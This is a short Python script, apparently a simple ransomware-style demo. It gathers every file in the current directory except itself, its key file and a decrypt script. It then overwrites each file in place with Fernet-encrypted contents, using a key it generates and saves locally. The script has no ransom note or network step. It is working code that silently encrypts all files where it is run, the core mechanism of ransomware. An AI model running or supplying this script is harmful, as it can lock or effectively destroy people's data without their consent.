#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
important = []

#add files to files array if file is a file
#add files to important array so they dont get encrypted

for file in os.listdir():
	if file == "encrypt.py" or file == "encryption.key" or file == "decrypt.py":
		important.append(file)
	else:
		if os.path.isfile(file):
			files.append(file)

print(files)

#generate a key if it doesnt exist and write it to encrpytion.key


if "encryption.key" not in important:
	key = Fernet.generate_key()
	with open("encryption.key", "wb") as encryptionkey:
		encryptionkey.write(key)
else:
	with open("encryption.key", "rb") as encryptionkey:
		key = encryptionkey.read()
		
#read files and encrypt them with the key

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("Files encrypted")
